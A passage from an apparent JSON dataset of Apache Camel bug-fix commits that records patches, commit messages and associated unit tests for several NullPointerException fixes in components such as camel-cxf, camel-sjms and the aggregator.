                "status": "modified"
            }
        ],
        "message": "improvement for CAMEL-3 so that boolean b = in.getHeader(\"foo\", boolean.class); does not throw a NPE for a missing header; instead false is returned for missing values\n\ngit-svn-id: https://svn.apache.org/repos/asf/activemq/camel/trunk@544115 13f79535-47bb-0310-9956-ffa450edef68",
        "parent": "https://github.com/apache/camel/commit/babdb30f14dfaa2f4eb8cb7153d8e4aa03f83ef9",
        "patched_files": [
            "Converter.java",
            "ObjectConverter.java",
            "DefaultTypeConverter.java",
            "IOConverter.java"
        ],
        "repo": "camel",
        "unit_tests": [
            "ConverterTest.java",
            "ObjectConverterTest.java",
            "IOConverterTest.java",
            "Issue3Test.java"
        ]
    },
    "camel_0ccf768": {
        "bug_id": "camel_0ccf768",
        "commit": "https://github.com/apache/camel/commit/0ccf7689046ab3f5e335582d7756f728e7bdf7d2",
        "file": [
            {
                "additions": 2,
                "blob_url": "https://github.com/apache/camel/blob/0ccf7689046ab3f5e335582d7756f728e7bdf7d2/components/camel-cxf/src/main/java/org/apache/camel/component/cxf/jaxrs/DefaultCxfRsBinding.java",
                "changes": 3,
                "contents_url": "https://api.github.com/repos/apache/camel/contents/components/camel-cxf/src/main/java/org/apache/camel/component/cxf/jaxrs/DefaultCxfRsBinding.java?ref=0ccf7689046ab3f5e335582d7756f728e7bdf7d2",
                "deletions": 1,
                "filename": "components/camel-cxf/src/main/java/org/apache/camel/component/cxf/jaxrs/DefaultCxfRsBinding.java",
                "patch": "@@ -72,7 +72,8 @@ public DefaultCxfRsBinding() {\n     \n     public Object populateCxfRsResponseFromExchange(Exchange camelExchange,\n                                                     org.apache.cxf.message.Exchange cxfExchange) throws Exception {\n-        if (camelExchange.isFailed()) {\n+        // Need to check if the exchange has the exception\n+        if (camelExchange.isFailed() && camelExchange.getException() != null) {\n             throw camelExchange.getException();\n         }\n ",
                "raw_url": "https://github.com/apache/camel/raw/0ccf7689046ab3f5e335582d7756f728e7bdf7d2/components/camel-cxf/src/main/java/org/apache/camel/component/cxf/jaxrs/DefaultCxfRsBinding.java",
                "sha": "6703af81f0efd386a03c4a4ac9329424a190a5f1",
                "status": "modified"
            },
            {
                "additions": 13,
                "blob_url": "https://github.com/apache/camel/blob/0ccf7689046ab3f5e335582d7756f728e7bdf7d2/components/camel-cxf/src/test/java/org/apache/camel/component/cxf/jaxrs/CxfRsConsumerTest.java",
                "changes": 13,
                "contents_url": "https://api.github.com/repos/apache/camel/contents/components/camel-cxf/src/test/java/org/apache/camel/component/cxf/jaxrs/CxfRsConsumerTest.java?ref=0ccf7689046ab3f5e335582d7756f728e7bdf7d2",
                "deletions": 0,
                "filename": "components/camel-cxf/src/test/java/org/apache/camel/component/cxf/jaxrs/CxfRsConsumerTest.java",
                "patch": "@@ -91,6 +91,10 @@ public void process(Exchange exchange) throws Exception {\n                                 if (\"/customerservice/customers/456\".equals(path)) {\n                                     Response r = Response.status(404).entity(\"Can't found the customer with uri \" + path).build();\n                                     throw new WebApplicationException(r);\n+                                } else if (\"/customerservice/customers/234\".equals(path)) {\n+                                    Response r = Response.status(404).entity(\"Can't found the customer with uri \" + path).build();\n+                                    exchange.getOut().setBody(r);\n+                                    exchange.getOut().setFault(true);\n                                 } else {\n                                     throw new RuntimeCamelException(\"Can't found the customer with uri \" + path);\n                                 }\n@@ -153,6 +157,15 @@ public void testGetWrongCustomer() throws Exception {\n         } catch (FileNotFoundException exception) {\n             // do nothing here\n         }\n+        \n+        url = new URL(\"http://localhost:\" + CXT + \"/rest/customerservice/customers/234\");\n+        try {\n+            url.openStream();\n+            fail(\"Expect to get exception here\");\n+        } catch (FileNotFoundException exception) {\n+            // do nothing here\n+        }\n+        \n         url = new URL(\"http://localhost:\" + CXT + \"/rest/customerservice/customers/256\");\n         try {\n             url.openStream();",
                "raw_url": "https://github.com/apache/camel/raw/0ccf7689046ab3f5e335582d7756f728e7bdf7d2/components/camel-cxf/src/test/java/org/apache/camel/component/cxf/jaxrs/CxfRsConsumerTest.java",
                "sha": "2dc110a137714a279ed797bba3863b4df47cbb60",
                "status": "modified"
            }
        ],
        "message": "CAMEL-7256 Fixed the NPE of DefaultCxfRsBinding",
        "parent": "https://github.com/apache/camel/commit/87105eee5c303af4751661af9480d4a76223b01b",
        "patched_files": [
            "DefaultCxfRsBinding.java",
            "CxfRsConsumer.java"
        ],
        "repo": "camel",
        "unit_tests": [
            "CxfRsConsumerTest.java",
            "DefaultCxfRsBindingTest.java"
        ]
    },
    "camel_0ff3783": {
        "bug_id": "camel_0ff3783",
        "commit": "https://github.com/apache/camel/commit/0ff3783f0d368703b5e7e9f38c963c4572de687d",
        "file": [
            {
                "additions": 2,
                "blob_url": "https://github.com/apache/camel/blob/0ff3783f0d368703b5e7e9f38c963c4572de687d/components/camel-sjms/src/main/java/org/apache/camel/component/sjms/SjmsConsumer.java",
                "changes": 4,
                "contents_url": "https://api.github.com/repos/apache/camel/contents/components/camel-sjms/src/main/java/org/apache/camel/component/sjms/SjmsConsumer.java?ref=0ff3783f0d368703b5e7e9f38c963c4572de687d",
                "deletions": 2,
                "filename": "components/camel-sjms/src/main/java/org/apache/camel/component/sjms/SjmsConsumer.java",
                "patch": "@@ -225,13 +225,13 @@ protected MessageListener createMessageHandler(Session session) {\n \n         AbstractMessageHandler messageHandler;\n         if (getEndpoint().getExchangePattern().equals(ExchangePattern.InOnly)) {\n-            if (isTransacted()) {\n+            if (isTransacted() || isSynchronous()) {\n                 messageHandler = new InOnlyMessageHandler(getEndpoint(), executor, synchronization);\n             } else {\n                 messageHandler = new InOnlyMessageHandler(getEndpoint(), executor);\n             }\n         } else {\n-            if (isTransacted()) {\n+            if (isTransacted() || isSynchronous()) {\n                 messageHandler = new InOutMessageHandler(getEndpoint(), executor, synchronization);\n             } else {\n                 messageHandler = new InOutMessageHandler(getEndpoint(), executor);",
                "raw_url": "https://github.com/apache/camel/raw/0ff3783f0d368703b5e7e9f38c963c4572de687d/components/camel-sjms/src/main/java/org/apache/camel/component/sjms/SjmsConsumer.java",
                "sha": "536a2bedb0e97bb43e0da8430d9fde14ff6f423b",
                "status": "modified"
            },
            {
                "additions": 3,
                "blob_url": "https://github.com/apache/camel/blob/0ff3783f0d368703b5e7e9f38c963c4572de687d/components/camel-sjms/src/main/java/org/apache/camel/component/sjms/consumer/AbstractMessageHandler.java",
                "changes": 12,
                "contents_url": "https://api.github.com/repos/apache/camel/contents/components/camel-sjms/src/main/java/org/apache/camel/component/sjms/consumer/AbstractMessageHandler.java?ref=0ff3783f0d368703b5e7e9f38c963c4572de687d",
                "deletions": 9,
                "filename": "components/camel-sjms/src/main/java/org/apache/camel/component/sjms/consumer/AbstractMessageHandler.java",
                "patch": "@@ -47,12 +47,11 @@\n     private boolean transacted;\n     private boolean sharedJMSSession;\n     private boolean synchronous = true;\n-    private Synchronization synchronization;\n+    private final Synchronization synchronization;\n     private boolean topic;\n \n     public AbstractMessageHandler(SjmsEndpoint endpoint, ExecutorService executor) {\n-        this.endpoint = endpoint;\n-        this.executor = executor;\n+        this(endpoint, executor, null);\n     }\n \n     public AbstractMessageHandler(SjmsEndpoint endpoint, ExecutorService executor, Synchronization synchronization) {\n@@ -61,18 +60,13 @@ public AbstractMessageHandler(SjmsEndpoint endpoint, ExecutorService executor, S\n         this.executor = executor;\n     }\n \n-    /*\n-     * @see javax.jms.MessageListener#onMessage(javax.jms.Message)\n-     *\n-     * @param message\n-     */\n     @Override\n     public void onMessage(Message message) {\n         RuntimeCamelException rce = null;\n         try {\n             final Exchange exchange = getEndpoint().createExchange(message, getSession());\n \n-            log.debug(\"Processing Exchange.id:{}\", exchange.getExchangeId());\n+            log.debug(\"Processing ExchangeId: {}\", exchange.getExchangeId());\n \n             if (isTransacted()) {\n                 if (isSharedJMSSession()) {",
                "raw_url": "https://github.com/apache/camel/raw/0ff3783f0d368703b5e7e9f38c963c4572de687d/components/camel-sjms/src/main/java/org/apache/camel/component/sjms/consumer/AbstractMessageHandler.java",
                "sha": "ed99e2029b889ab17343bed3c6ab2dce6f25556a",
                "status": "modified"
            },
            {
                "additions": 4,
                "blob_url": "https://github.com/apache/camel/blob/0ff3783f0d368703b5e7e9f38c963c4572de687d/components/camel-sjms/src/main/java/org/apache/camel/component/sjms/consumer/InOnlyMessageHandler.java",
                "changes": 19,
                "contents_url": "https://api.github.com/repos/apache/camel/contents/components/camel-sjms/src/main/java/org/apache/camel/component/sjms/consumer/InOnlyMessageHandler.java?ref=0ff3783f0d368703b5e7e9f38c963c4572de687d",
                "deletions": 15,
                "filename": "components/camel-sjms/src/main/java/org/apache/camel/component/sjms/consumer/InOnlyMessageHandler.java",
                "patch": "@@ -28,26 +28,14 @@\n  */\n public class InOnlyMessageHandler extends AbstractMessageHandler {\n \n-    /**\n-     * @param endpoint\n-     * @param executor\n-     */\n     public InOnlyMessageHandler(SjmsEndpoint endpoint, ExecutorService executor) {\n         super(endpoint, executor);\n     }\n \n-    /**\n-     * @param endpoint\n-     * @param executor\n-     * @param synchronization\n-     */\n     public InOnlyMessageHandler(SjmsEndpoint endpoint, ExecutorService executor, Synchronization synchronization) {\n         super(endpoint, executor, synchronization);\n     }\n \n-    /**\n-     * @param exchange\n-     */\n     @Override\n     public void handleMessage(final Exchange exchange) {\n         if (log.isDebugEnabled()) {\n@@ -56,8 +44,7 @@ public void handleMessage(final Exchange exchange) {\n         if (!exchange.isFailed()) {\n             NoOpAsyncCallback callback = new NoOpAsyncCallback();\n             if (isTransacted() || isSynchronous()) {\n-                // must process synchronous if transacted or configured to\n-                // do so\n+                // must process synchronous if transacted or configured to do so\n                 if (log.isDebugEnabled()) {\n                     log.debug(\"Synchronous processing: Message[{}], Destination[{}] \", exchange.getIn().getBody(), getEndpoint().getEndpointUri());\n                 }\n@@ -70,7 +57,9 @@ public void handleMessage(final Exchange exchange) {\n                 }\n             } else {\n                 // process asynchronous using the async routing engine\n-                log.debug(\"Asynchronous processing: Message[{}], Destination[{}] \", exchange.getIn().getBody(), getEndpoint().getEndpointUri());\n+                if (log.isDebugEnabled()) {\n+                    log.debug(\"Asynchronous processing: Message[{}], Destination[{}] \", exchange.getIn().getBody(), getEndpoint().getEndpointUri());\n+                }\n \n                 getProcessor().process(exchange, callback);\n             }",
                "raw_url": "https://github.com/apache/camel/raw/0ff3783f0d368703b5e7e9f38c963c4572de687d/components/camel-sjms/src/main/java/org/apache/camel/component/sjms/consumer/InOnlyMessageHandler.java",
                "sha": "6e4f67daea4777b60f08744fa163088acec5d965",
                "status": "modified"
            },
            {
                "additions": 5,
                "blob_url": "https://github.com/apache/camel/blob/0ff3783f0d368703b5e7e9f38c963c4572de687d/components/camel-sjms/src/main/java/org/apache/camel/component/sjms/consumer/InOutMessageHandler.java",
                "changes": 9,
                "contents_url": "https://api.github.com/repos/apache/camel/contents/components/camel-sjms/src/main/java/org/apache/camel/component/sjms/consumer/InOutMessageHandler.java?ref=0ff3783f0d368703b5e7e9f38c963c4572de687d",
                "deletions": 4,
                "filename": "components/camel-sjms/src/main/java/org/apache/camel/component/sjms/consumer/InOutMessageHandler.java",
                "patch": "@@ -91,8 +91,7 @@ public void handleMessage(final Exchange exchange) {\n                 return;\n             } else {\n                 if (isTransacted() || isSynchronous()) {\n-                    // must process synchronous if transacted or configured to\n-                    // do so\n+                    // must process synchronous if transacted or configured to do so\n                     log.debug(\"Synchronous processing: Message[{}], Destination[{}] \", exchange.getIn().getBody(), getEndpoint().getEndpointUri());\n                     try {\n                         getProcessor().process(exchange);\n@@ -103,7 +102,9 @@ public void handleMessage(final Exchange exchange) {\n                     }\n                 } else {\n                     // process asynchronous using the async routing engine\n-                    log.debug(\"Asynchronous processing: Message[{}], Destination[{}] \", exchange.getIn().getBody(), getEndpoint().getEndpointUri());\n+                    if (log.isDebugEnabled()) {\n+                        log.debug(\"Asynchronous processing: Message[{}], Destination[{}] \", exchange.getIn().getBody(), getEndpoint().getEndpointUri());\n+                    }\n                     getProcessor().process(exchange, callback);\n                 }\n             }\n@@ -122,7 +123,7 @@ public void close() {\n             try {\n                 entry.getValue().close();\n             } catch (JMSException e) {\n-                log.debug(\"Cached MessageProducer with key:{} threw an unexpected exception\", entry.getKey(), e);\n+                log.debug(\"Cached MessageProducer with key: \" + entry.getKey() + \" threw an unexpected exception. This exception is ignored.\", e);\n             }\n         }\n         producerCache.clear();",
                "raw_url": "https://github.com/apache/camel/raw/0ff3783f0d368703b5e7e9f38c963c4572de687d/components/camel-sjms/src/main/java/org/apache/camel/component/sjms/consumer/InOutMessageHandler.java",
                "sha": "0518f583365527f71017149f4cb85b26401b6763",
                "status": "modified"
            },
            {
                "additions": 3,
                "blob_url": "https://github.com/apache/camel/blob/0ff3783f0d368703b5e7e9f38c963c4572de687d/components/camel-sjms/src/main/java/org/apache/camel/component/sjms/producer/InOnlyProducer.java",
                "changes": 5,
                "contents_url": "https://api.github.com/repos/apache/camel/contents/components/camel-sjms/src/main/java/org/apache/camel/component/sjms/producer/InOnlyProducer.java?ref=0ff3783f0d368703b5e7e9f38c963c4572de687d",
                "deletions": 2,
                "filename": "components/camel-sjms/src/main/java/org/apache/camel/component/sjms/producer/InOnlyProducer.java",
                "patch": "@@ -21,6 +21,7 @@\n import java.util.List;\n import javax.jms.Message;\n import org.apache.camel.AsyncCallback;\n+import org.apache.camel.CamelExchangeException;\n import org.apache.camel.Endpoint;\n import org.apache.camel.Exchange;\n import org.apache.camel.component.sjms.BatchMessage;\n@@ -30,7 +31,7 @@\n import org.apache.camel.component.sjms.tx.DefaultTransactionCommitStrategy;\n \n /**\n- * A Camel Producer that provides the InOnly Exchange pattern..\n+ * A Camel Producer that provides the InOnly Exchange pattern.\n  */\n public class InOnlyProducer extends SjmsProducer {\n \n@@ -76,7 +77,7 @@ public void sendMessage(final Exchange exchange, final AsyncCallback callback, f\n                 producer.getMessageProducer().send(message);\n             }\n         } catch (Exception e) {\n-            exchange.setException(new Exception(\"Unable to complete sending the message: \", e));\n+            exchange.setException(new CamelExchangeException(\"Unable to complete sending the JMS message\", exchange, e));\n         } finally {\n             releaseProducerCallback.release(producer);\n             callback.done(isSynchronous());",
                "raw_url": "https://github.com/apache/camel/raw/0ff3783f0d368703b5e7e9f38c963c4572de687d/components/camel-sjms/src/main/java/org/apache/camel/component/sjms/producer/InOnlyProducer.java",
                "sha": "099771922935483974c1fe91096f56213d1b3abd",
                "status": "modified"
            },
            {
                "additions": 3,
                "blob_url": "https://github.com/apache/camel/blob/0ff3783f0d368703b5e7e9f38c963c4572de687d/components/camel-sjms/src/main/java/org/apache/camel/component/sjms/producer/InOutProducer.java",
                "changes": 8,
                "contents_url": "https://api.github.com/repos/apache/camel/contents/components/camel-sjms/src/main/java/org/apache/camel/component/sjms/producer/InOutProducer.java?ref=0ff3783f0d368703b5e7e9f38c963c4572de687d",
                "deletions": 5,
                "filename": "components/camel-sjms/src/main/java/org/apache/camel/component/sjms/producer/InOutProducer.java",
                "patch": "@@ -94,7 +94,6 @@ public MessageConsumerResources makeObject() throws Exception {\n                 }\n                 MessageConsumer messageConsumer = getEndpoint().getJmsObjectFactory().createMessageConsumer(session, replyToDestination, null, isTopic(), null, true, false, false);\n                 messageConsumer.setMessageListener(new MessageListener() {\n-\n                     @Override\n                     public void onMessage(final Message message) {\n                         log.debug(\"Message Received in the Consumer Pool\");\n@@ -103,9 +102,8 @@ public void onMessage(final Message message) {\n                             Exchanger<Object> exchanger = EXCHANGERS.get(message.getJMSCorrelationID());\n                             exchanger.exchange(message, getResponseTimeOut(), TimeUnit.MILLISECONDS);\n                         } catch (Exception e) {\n-                            log.error(\"Unable to exchange message: {}\", message, e);\n+                            log.warn(\"Unable to exchange message: {}. This exception is ignored.\", message, e);\n                         }\n-\n                     }\n                 });\n                 answer = new MessageConsumerResources(session, messageConsumer, replyToDestination);\n@@ -141,11 +139,11 @@ public void destroyObject(MessageConsumerResources model) throws Exception {\n     protected void doStart() throws Exception {\n \n         if (isEndpointTransacted()) {\n-            throw new IllegalArgumentException(\"InOut exchange pattern is incompatible with transacted=true as it cuases a deadlock. Please use transacted=false or InOnly exchange pattern.\");\n+            throw new IllegalArgumentException(\"InOut exchange pattern is incompatible with transacted=true as it cause a deadlock. Please use transacted=false or InOnly exchange pattern.\");\n         }\n \n         if (ObjectHelper.isEmpty(getNamedReplyTo())) {\n-            log.debug(\"No reply to destination is defined.  Using temporary destinations.\");\n+            log.debug(\"No reply to destination is defined. Using temporary destinations.\");\n         } else {\n             log.debug(\"Using {} as the reply to destination.\", getNamedReplyTo());\n         }",
                "raw_url": "https://github.com/apache/camel/raw/0ff3783f0d368703b5e7e9f38c963c4572de687d/components/camel-sjms/src/main/java/org/apache/camel/component/sjms/producer/InOutProducer.java",
                "sha": "90c159ed9c5f6df3535d77680c5c436a721a83ed",
                "status": "modified"
            },
            {
                "additions": 4,
                "blob_url": "https://github.com/apache/camel/blob/0ff3783f0d368703b5e7e9f38c963c4572de687d/components/camel-sjms/src/main/java/org/apache/camel/component/sjms/tx/SessionTransactionSynchronization.java",
                "changes": 9,
                "contents_url": "https://api.github.com/repos/apache/camel/contents/components/camel-sjms/src/main/java/org/apache/camel/component/sjms/tx/SessionTransactionSynchronization.java?ref=0ff3783f0d368703b5e7e9f38c963c4572de687d",
                "deletions": 5,
                "filename": "components/camel-sjms/src/main/java/org/apache/camel/component/sjms/tx/SessionTransactionSynchronization.java",
                "patch": "@@ -44,32 +44,31 @@ public SessionTransactionSynchronization(Session session, TransactionCommitStrat\n         }\n     }\n \n-\n     @Override\n     public void onFailure(Exchange exchange) {\n         try {\n             if (commitStrategy.rollback(exchange)) {\n-                LOG.debug(\"Processing failure of Exchange id: {}\", exchange.getExchangeId());\n+                LOG.debug(\"Processing failure of ExchangeId: {}\", exchange.getExchangeId());\n                 if (session != null && session.getTransacted()) {\n                     session.rollback();\n                 }\n             }\n         } catch (Exception e) {\n-            LOG.warn(\"Failed to rollback the session: {}\", e.getMessage());\n+            LOG.warn(\"Failed to rollback the JMS session: {}\", e.getMessage());\n         }\n     }\n \n     @Override\n     public void onComplete(Exchange exchange) {\n         try {\n             if (commitStrategy.commit(exchange)) {\n-                LOG.debug(\"Processing completion of Exchange id: {}\", exchange.getExchangeId());\n+                LOG.debug(\"Processing completion of ExchangeId: {}\", exchange.getExchangeId());\n                 if (session != null && session.getTransacted()) {\n                     session.commit();\n                 }\n             }\n         } catch (Exception e) {\n-            LOG.warn(\"Failed to commit the session: {}\", e.getMessage());\n+            LOG.warn(\"Failed to commit the JMS session: {}\", e.getMessage());\n             exchange.setException(e);\n         }\n     }",
                "raw_url": "https://github.com/apache/camel/raw/0ff3783f0d368703b5e7e9f38c963c4572de687d/components/camel-sjms/src/main/java/org/apache/camel/component/sjms/tx/SessionTransactionSynchronization.java",
                "sha": "7bbe3786d5d2107d29fc2123b259808ce3048265",
                "status": "modified"
            },
            {
                "additions": 50,
                "blob_url": "https://github.com/apache/camel/blob/0ff3783f0d368703b5e7e9f38c963c4572de687d/components/camel-sjms/src/test/java/org/apache/camel/component/sjms/consumer/InOnlyConsumerQueueSynchronousTest.java",
                "changes": 50,
                "contents_url": "https://api.github.com/repos/apache/camel/contents/components/camel-sjms/src/test/java/org/apache/camel/component/sjms/consumer/InOnlyConsumerQueueSynchronousTest.java?ref=0ff3783f0d368703b5e7e9f38c963c4572de687d",
                "deletions": 0,
                "filename": "components/camel-sjms/src/test/java/org/apache/camel/component/sjms/consumer/InOnlyConsumerQueueSynchronousTest.java",
                "patch": "@@ -0,0 +1,50 @@\n+/**\n+ * Licensed to the Apache Software Foundation (ASF) under one or more\n+ * contributor license agreements.  See the NOTICE file distributed with\n+ * this work for additional information regarding copyright ownership.\n+ * The ASF licenses this file to You under the Apache License, Version 2.0\n+ * (the \"License\"); you may not use this file except in compliance with\n+ * the License.  You may obtain a copy of the License at\n+ *\n+ *      http://www.apache.org/licenses/LICENSE-2.0\n+ *\n+ * Unless required by applicable law or agreed to in writing, software\n+ * distributed under the License is distributed on an \"AS IS\" BASIS,\n+ * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n+ * See the License for the specific language governing permissions and\n+ * limitations under the License.\n+ */\n+package org.apache.camel.component.sjms.consumer;\n+\n+import org.apache.camel.builder.RouteBuilder;\n+import org.apache.camel.component.mock.MockEndpoint;\n+import org.apache.camel.component.sjms.support.JmsTestSupport;\n+import org.junit.Test;\n+\n+public class InOnlyConsumerQueueSynchronousTest extends JmsTestSupport {\n+\n+    private static final String SJMS_QUEUE_NAME = \"sjms:queue:in.only.consumer.queue?synchronous=true\";\n+    private static final String MOCK_RESULT = \"mock:result\";\n+\n+    @Test\n+    public void testSynchronous() throws Exception {\n+        final String expectedBody = \"Hello World\";\n+        MockEndpoint mock = getMockEndpoint(MOCK_RESULT);\n+        mock.expectedMessageCount(1);\n+        mock.expectedBodiesReceived(expectedBody);\n+\n+        template.sendBody(SJMS_QUEUE_NAME, expectedBody);\n+        \n+        mock.assertIsSatisfied();\n+    }\n+\n+    protected RouteBuilder createRouteBuilder() throws Exception {\n+        return new RouteBuilder() {\n+            public void configure() throws Exception {\n+                from(SJMS_QUEUE_NAME)\n+                    .to(MOCK_RESULT);\n+            }\n+        };\n+    }\n+\n+}",
                "raw_url": "https://github.com/apache/camel/raw/0ff3783f0d368703b5e7e9f38c963c4572de687d/components/camel-sjms/src/test/java/org/apache/camel/component/sjms/consumer/InOnlyConsumerQueueSynchronousTest.java",
                "sha": "47af0ede08e0c39ade3e20632577b05325fa3123",
                "status": "added"
            }
        ],
        "message": "CAMEL-12335: Fixed NPE in camel-sjms consumer if synchronous=true. Polished the logging code a bit.",
        "parent": "https://github.com/apache/camel/commit/d236db64791d33d01f7655d700a12eb10fa7a726",
        "patched_files": [
            "SjmsConsumer.java",
            "SessionTransactionSynchronization.java",
            "InOutProducer.java",
            "AbstractMessageHandler.java",
            "InOnlyProducer.java",
            "InOnlyMessageHandler.java",
            "InOutMessageHandler.java"
        ],
        "repo": "camel",
        "unit_tests": [
            "InOnlyConsumerQueueSynchronousTest.java"
        ]
    },
    "camel_102e2d1": {
        "bug_id": "camel_102e2d1",
        "commit": "https://github.com/apache/camel/commit/102e2d115d152d735c726408c2c5a988d38c53c6",
        "file": [
            {
                "additions": 6,
                "blob_url": "https://github.com/apache/camel/blob/102e2d115d152d735c726408c2c5a988d38c53c6/camel-core/src/main/java/org/apache/camel/processor/aggregate/AggregateProcessor.java",
                "changes": 8,
                "contents_url": "https://api.github.com/repos/apache/camel/contents/camel-core/src/main/java/org/apache/camel/processor/aggregate/AggregateProcessor.java?ref=102e2d115d152d735c726408c2c5a988d38c53c6",
                "deletions": 2,
                "filename": "camel-core/src/main/java/org/apache/camel/processor/aggregate/AggregateProcessor.java",
                "patch": "@@ -244,8 +244,12 @@ private Exchange doAggregation(String key, Exchange exchange) throws CamelExchan\n         } else {\n             // if batch consumer completion is enabled then we need to complete the group\n             if (\"consumer\".equals(complete)) {\n-                for (String batchKey : batchConsumerCorrelationKeys) {\n+                for (String batchKey : batchConsumerCorrelationKeys) {                    \n                     Exchange batchAnswer = aggregationRepository.get(camelContext, batchKey);\n+                    // There is no aggregated exchange\n+                    if (batchAnswer == null) {\n+                        batchAnswer = answer;\n+                    }\n                     batchAnswer.setProperty(Exchange.AGGREGATED_COMPLETED_BY, complete);\n                     onCompletion(batchKey, batchAnswer, false);\n                 }\n@@ -318,7 +322,7 @@ protected String isCompleted(String key, Exchange exchange) {\n             timeoutMap.put(key, exchange.getExchangeId(), getCompletionTimeout());\n         }\n \n-        if (isCompletionFromBatchConsumer()) {\n+        if (isCompletionFromBatchConsumer()) {            \n             batchConsumerCorrelationKeys.add(key);\n             batchConsumerCounter.incrementAndGet();\n             int size = exchange.getProperty(Exchange.BATCH_SIZE, 0, Integer.class);",
                "raw_url": "https://github.com/apache/camel/raw/102e2d115d152d735c726408c2c5a988d38c53c6/camel-core/src/main/java/org/apache/camel/processor/aggregate/AggregateProcessor.java",
                "sha": "1ae428a1de74d7234c0dab9eeb8168b528307375",
                "status": "modified"
            },
            {
                "additions": 58,
                "blob_url": "https://github.com/apache/camel/blob/102e2d115d152d735c726408c2c5a988d38c53c6/camel-core/src/test/java/org/apache/camel/processor/aggregator/AggregateExpressionTest.java",
                "changes": 58,
                "contents_url": "https://api.github.com/repos/apache/camel/contents/camel-core/src/test/java/org/apache/camel/processor/aggregator/AggregateExpressionTest.java?ref=102e2d115d152d735c726408c2c5a988d38c53c6",
                "deletions": 0,
                "filename": "camel-core/src/test/java/org/apache/camel/processor/aggregator/AggregateExpressionTest.java",
                "patch": "@@ -0,0 +1,58 @@\n+/**\n+ * Licensed to the Apache Software Foundation (ASF) under one or more\n+ * contributor license agreements.  See the NOTICE file distributed with\n+ * this work for additional information regarding copyright ownership.\n+ * The ASF licenses this file to You under the Apache License, Version 2.0\n+ * (the \"License\"); you may not use this file except in compliance with\n+ * the License.  You may obtain a copy of the License at\n+ *\n+ *      http://www.apache.org/licenses/LICENSE-2.0\n+ *\n+ * Unless required by applicable law or agreed to in writing, software\n+ * distributed under the License is distributed on an \"AS IS\" BASIS,\n+ * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n+ * See the License for the specific language governing permissions and\n+ * limitations under the License.\n+ */\n+package org.apache.camel.processor.aggregator;\n+\n+import java.util.HashMap;\n+import java.util.Map;\n+\n+import org.apache.camel.ContextTestSupport;\n+import org.apache.camel.Exchange;\n+import org.apache.camel.Processor;\n+import org.apache.camel.builder.RouteBuilder;\n+import org.apache.camel.component.mock.MockEndpoint;\n+import org.apache.camel.processor.BodyInAggregatingStrategy;\n+\n+public class AggregateExpressionTest extends ContextTestSupport {\n+\n+    public void testAggregateExpressionSize() throws Exception {\n+        MockEndpoint result =  getMockEndpoint(\"mock:result\");\n+        result.expectedBodiesReceived(\"A+A\", \"B+B\", \"Z\");\n+\n+        template.sendBody(\"direct:start\", \"A\");\n+        template.sendBody(\"direct:start\", \"B\");\n+        template.sendBody(\"direct:start\", \"A\");\n+        template.sendBody(\"direct:start\", \"B\");\n+        // send the last one with the batch size property\n+        template.sendBodyAndProperty(\"direct:start\", \"Z\", Exchange.BATCH_SIZE, 5);\n+\n+        assertMockEndpointsSatisfied();\n+    }\n+\n+    @Override\n+    protected RouteBuilder createRouteBuilder() throws Exception {\n+        return new RouteBuilder() {\n+            @Override\n+            public void configure() throws Exception {\n+                // START SNIPPET: e1\n+                from(\"direct:start\")                    \n+                    .aggregate(body(), new BodyInAggregatingStrategy()).completionFromBatchConsumer()\n+                    .to(\"mock:result\");\n+                // END SNIPPET: e1\n+            }\n+        };\n+    }\n+}",
                "raw_url": "https://github.com/apache/camel/raw/102e2d115d152d735c726408c2c5a988d38c53c6/camel-core/src/test/java/org/apache/camel/processor/aggregator/AggregateExpressionTest.java",
                "sha": "53c38da51a84b6a6177a97005b758d8175e72ab9",
                "status": "added"
            }
        ],
        "message": "CAMEL-2798 Fixed the NPE of aggregator\n\ngit-svn-id: https://svn.apache.org/repos/asf/camel/trunk@952952 13f79535-47bb-0310-9956-ffa450edef68",
        "parent": "https://github.com/apache/camel/commit/5a9f4315b22ce1f17f11535914d2945db6c75def",
        "patched_files": [
            "AggregateProcessor.java"
        ],
        "repo": "camel",
        "unit_tests": [
            "AggregateExpressionTest.java",
            "AggregateProcessorTest.java"
        ]
    },
    "camel_1099b8c": {
        "bug_id": "camel_1099b8c",
        "commit": "https://github.com/apache/camel/commit/1099b8ce94a928b5b111ff859793ca85168c5eab",
        "file": [
            {
                "additions": 6,
                "blob_url": "https://github.com/apache/camel/blob/1099b8ce94a928b5b111ff859793ca85168c5eab/camel-core/src/main/java/org/apache/camel/management/mbean/ManagedCamelContext.java",
                "changes": 8,
                "contents_url": "https://api.github.com/repos/apache/camel/contents/camel-core/src/main/java/org/apache/camel/management/mbean/ManagedCamelContext.java?ref=1099b8ce94a928b5b111ff859793ca85168c5eab",
                "deletions": 2,
                "filename": "camel-core/src/main/java/org/apache/camel/management/mbean/ManagedCamelContext.java",
                "patch": "@@ -408,8 +408,12 @@ public String getComponentDocumentation(String componentName) throws IOException\n \n     public String componentParameterJsonSchema(String componentName) throws Exception {\n         Component component = context.getComponent(componentName);\n-        ComponentConfiguration configuration = component.createComponentConfiguration();\n-        return configuration.createParameterJsonSchema();\n+        if (component != null) {\n+            ComponentConfiguration configuration = component.createComponentConfiguration();\n+            return configuration.createParameterJsonSchema();\n+        } else {\n+            return null;\n+        }\n     }\n \n     public void reset(boolean includeRoutes) throws Exception {",
                "raw_url": "https://github.com/apache/camel/raw/1099b8ce94a928b5b111ff859793ca85168c5eab/camel-core/src/main/java/org/apache/camel/management/mbean/ManagedCamelContext.java",
                "sha": "75a4610eb2091f40689dadfc5d441e8c61add725",
                "status": "modified"
            }
        ],
        "message": "Avoid potential NPE",
        "parent": "https://github.com/apache/camel/commit/4bcf108874df0c138cf6cf2afbfc27fca9d1d905",
        "patched_files": [
            "ManagedCamelContext.java"
        ],
        "repo": "camel",
        "unit_tests": [
            "ManagedCamelContextTest.java"
        ]
    },
    "camel_11a781a": {
        "bug_id": "camel_11a781a",
        "commit": "https://github.com/apache/camel/commit/11a781af420128e509e7985d0696a6d3cb0ea62b",
        "file": [
            {
                "additions": 20,
                "blob_url": "https://github.com/apache/camel/blob/11a781af420128e509e7985d0696a6d3cb0ea62b/camel-core/src/main/java/org/apache/camel/builder/PredicateBuilder.java",
                "changes": 20,
                "contents_url": "https://api.github.com/repos/apache/camel/contents/camel-core/src/main/java/org/apache/camel/builder/PredicateBuilder.java?ref=11a781af420128e509e7985d0696a6d3cb0ea62b",
                "deletions": 0,
